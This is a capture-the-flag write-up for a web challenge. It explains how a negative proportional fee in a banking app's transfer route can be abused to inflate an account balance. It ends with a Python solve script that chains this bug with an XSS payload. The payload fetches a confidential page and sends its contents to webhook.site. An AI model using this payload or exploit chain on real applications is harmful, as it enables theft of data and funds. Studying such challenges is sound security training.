---
created: 2025-11-16T08:19
updated: 2025-11-16T09:51
title: A Very Safe Locker For Real Now
description: still very unsafe locker
solves: 16
points: 420
---

The unintended NoSQL injection was quickly fixed by the author and they released a second challenge, now I need to do it for real.

After analyzing the application it is clear that to deliver the XSS payload we have to somehow make our balance super high `1_000_000_000_000`.

Well at first I thought we could make our balance `NaN` and it would bypass all the checks.

```js
NaN < 1_000_000_000_000 === false;
```

This was my target, basically I would want to first zero out my balance, so the next transfer would be division by zero and make it `NaN`.

```js
// this is /transfer route
if (!user_to) {
  console.log("user_from.mainBalance:", user_from.mainBalance);
  const fee_proportion = 100 * (amount / user_from.mainBalance); // Fee is proportional to the amount attempted to be sent
  user_from.mainBalance -= fee_proportion;
  console.log("user_from.mainBalance after fee:", user_from.mainBalance);
  await user_from.save();

  return res.render("index", {
    user: req.user,
    balance: user_from.mainBalance,
    failMessage:
      "Failed to find the recipient user, a percentage fee has been applied to your account for this failed transaction.",
  });
}
```

However I just typed 10 in, and made it transfer to an unknown email, and guess what, my balance is now negative.

```
node-1   | user_from.mainBalance: 10
node-1   | user_from.mainBalance after fee: -90
node-1   | user_from.mainBalance: -90
node-1   | user_from.mainBalance after fee: -78.88888888888889
```

Wow, I mean, do you notice how our balance increased after the second fee deduction?

Yes, because our balance is negative now, the fee is also negative.

Well now the solve is pretty straightforward, just first make a transfer to make our balance negative, and a second transfer so high that the fee is super high negative number, making our balance super high positive number.

Then we can deliver our XSS payload to exfiltrate the flag.

```python
import requests
# target = "https://4933aae1f3200c7d.chal.ctf.ae"
target = "https://faece85f1836ef6f.chal.ctf.ae"
s = requests.Session()
s1 = requests.Session()
# const { firstName, lastName, phoneNumber, email, password } = req.body
print(s.post(f"{target}/register", data={
    "firstName": "Yun",
    "lastName": "Yun",
    "phoneNumber": "1234567890",
    "email": "yun@yun.ng",
    "password": "yunyunyun"
}))
print(s.post(f"{target}/login", data={
    "email": "yun@yun.ng",
    "password": "yunyunyun"
}))
# let { receiverInfo, amount } = req.body
print(s.post(f"{target}/transfer", data={
    "receiverInfo": "yun@yun.ng.ww",
    "amount": "10"
}).text)
print(s.post(f"{target}/transfer", data={
    "receiverInfo": "yun@yun.ng.ww",
    "amount": "1000000000000"
}).text)
print(s.post(f"{target}/master", data={
    "email": "yun@yun.ng",
    "amount": "1",
    "userMessage": "\\\"}+${fetch(`/master/confedential`).then(function(res){return res.text()}).then(function(data){location=(`https://webhook.site/?data=`+data)})}"
}))
```

```flag
flag{a41e7bc831b428d6}
```
